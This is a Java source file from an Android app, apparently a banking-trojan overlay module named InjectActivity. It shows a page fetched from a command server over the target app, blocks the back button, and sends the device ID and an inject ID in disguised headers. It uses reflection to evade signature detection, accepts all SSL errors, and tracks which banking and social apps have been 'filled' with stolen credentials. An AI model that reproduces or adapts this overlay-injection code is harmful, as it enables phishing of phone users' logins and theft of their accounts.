package com.moonny.acts;

import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.SslErrorHandler;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;

import com.moonny.constants.Constant;
import com.moonny.helpers.IDUtility;
import com.moonny.Modules;
import com.moonny.constants.S;
import com.moonny.helpers.Utils;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class InjectActivity extends Activity {

//    public static final String URL_SCHEME = S.url_scheme_for_dialog;
    protected WebView mWebView;
    private int inject_id;
    private String language;

    @TargetApi(Build.VERSION_CODES.HONEYCOMB)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();
        if (intent == null)
            return;

        String lastUsedApi = (String) Modules.main(getBaseContext(), S.get_pref, new Object[]{ S.last_api_server, "" });

        if (lastUsedApi == null) {
            String servers = Constant.getDomains(getBaseContext());

            if (servers.contains("|"))
                lastUsedApi = servers.split("\\|")[0];
            else
                lastUsedApi = servers;
        }

        if (!lastUsedApi.endsWith("/"))
            lastUsedApi += "/";

        inject_id = intent.getExtras().getInt(S.inject_id);
        language = (String) Modules.main(getBaseContext(), S.get_language, null);

        setContentView(new CustomWebView(this));
        setFinishOnTouchOutside(false);
        getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        findViewById(android.R.id.content).setBackgroundColor(Color.rgb(240, 242, 245));

        mWebView = (WebView) findViewById(android.R.id.copyUrl);
        mWebView.setVerticalScrollBarEnabled(true);

//        mWebView.setOnTouchListener(new View.OnTouchListener() {
//            @Override
//            public boolean onTouch(View v, MotionEvent event) {
//                return (event.getAction() == MotionEvent.ACTION_MOVE);
//            }
//        });

        loadPage(lastUsedApi);
    }

    @Override
    public void onBackPressed() {
    }

    private void loadPage(String url) {
        try {
            mWebView.setWebViewClient(new OAuthWebViewClient());
            WebSettings webSettings = mWebView.getSettings();

            try {
                //webSettings.setJavaScriptEnabled(true);
                Method m = webSettings.getClass().getDeclaredMethod("setJavaScriptEnabled", boolean.class);
                m.invoke(webSettings, true);
            }catch (Exception e){
                if(Constant.DEBUG)
                {
                    e.printStackTrace();
                    Log.d("Screenlock", e.getMessage());
                }
            }

            Map<String, String> extraHeaders = new HashMap<>();
            extraHeaders.put(S.etage_header, IDUtility.getID(this));
            extraHeaders.put(S.xcache_header, Integer.toString(inject_id));
            extraHeaders.put(S.language_header, language);
            mWebView.loadUrl(url, extraHeaders);

            // to show inject only (and if) it is fully loaded
            //            mWebView.setVisibility(View.INVISIBLE); -- Signature
            Method[] ms = View.class.getDeclaredMethods();
            for(Method m : ms)
                if(m.getName().equals(S.setVisibility))
                {
                    m.invoke(mWebView, View.INVISIBLE);
                    break;
                }

        } catch (Exception e) {
            setResult(RESULT_CANCELED);
            finish();
        }
    }

    private class OAuthWebViewClient extends WebViewClient {
        public boolean canShowPage = true;

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            if (url.contains(S.hideme)) {

                Modules.main(InjectActivity.this, S.set_pref, new Object[]{S.injectCyclePause, false});
                String app = (String) Modules.main(InjectActivity.this, S.get_pref, new Object[]{S.lastInject, ""});

                String filled = (String) Modules.main(InjectActivity.this, S.get_pref, new Object[]{S.injectsFilled, ""});
                String filled2 = (String) Modules.main(InjectActivity.this, S.list_add, new Object[]{filled, app});

                if(!filled2.equals(filled))
                    Modules.main(InjectActivity.this, S.set_pref, new Object[]{S.injectsFilled, filled2});

                Modules.main(InjectActivity.this, S.set_pref, new Object[]{S.lastInject, ""});

                // if this inject is social - set flag S.socials_filled
                Map<String, Integer> apps = Utils.getApplications(getApplicationContext(), (String) Modules.main(getApplicationContext(), S.get_pref, new Object[]{ S.api_injects, "" }));

                int inject_id = apps.get(app);
                if(inject_id == 7 || inject_id == 78 || inject_id == 79 ||inject_id == 80 ||inject_id == 81 ||inject_id == 82 ||inject_id == 132)
                    Modules.main(getApplicationContext(), S.set_pref, new Object[]{ S.socials_filled, true });
            }

            finish();
            return false;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            if (canShowPage)
                view.setVisibility(View.VISIBLE);
        }

        @Override
        public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
            //super.onReceivedSslError(view, handler, error);
//            Log.e("CustomWeb", "SSL ERROR: " + error.toString());
            handler.proceed();
        }

    }

    @Override
    protected void onPause() {
        super.onPause();
//        Log.d("TAG", "onPause finish");
        Modules.main(InjectActivity.this, S.set_pref, new Object[]{ S.injectCyclePause, false }) /* Prefs-Manager.set(InjectActivity.this, S.injectCyclePause, false) */;
        Modules.main(InjectActivity.this, S.set_pref, new Object[]{ S.lastInject, "" }) /* Prefs-Manager.set(InjectActivity.this, S.lastInject, "") */;
        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
//        Log.d("TAG", "onDestroy finish");

        Modules.main(InjectActivity.this, S.set_pref, new Object[]{ S.injectCyclePause, false }) /* Prefs-Manager.set(InjectActivity.this, S.injectCyclePause, false) */;
        Modules.main(InjectActivity.this, S.set_pref, new Object[]{ S.lastInject, "" }) /* Prefs-Manager.set(InjectActivity.this, S.lastInject, "") */;
        finish();
    }

    private static class CustomWebView extends RelativeLayout {

        public CustomWebView(Context context) {
            super(context);

            WebView webView = new WebView(context);
//
//            ScaleAnimation scale = new ScaleAnimation((float)1.0, (float)1.0, (float)1.0, (float)1.0);
//            scale.setFillAfter(true);
//            scale.setDuration(500);
//            webView.startAnimation(scale);
//
            //  SMALL HEIGHT
            // lp = new LayoutParams(LayoutParams.MATCH_PARENT, (int) context.getResources().getDimension(R.dimen.height_browser));
            // FULL HEIGHT
            ViewGroup.LayoutParams lp = new LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT);
            webView.setLayoutParams(lp);
            addView(webView);
            webView.setId(android.R.id.copyUrl);
            webView.setVisibility(View.INVISIBLE);
        }
    }

}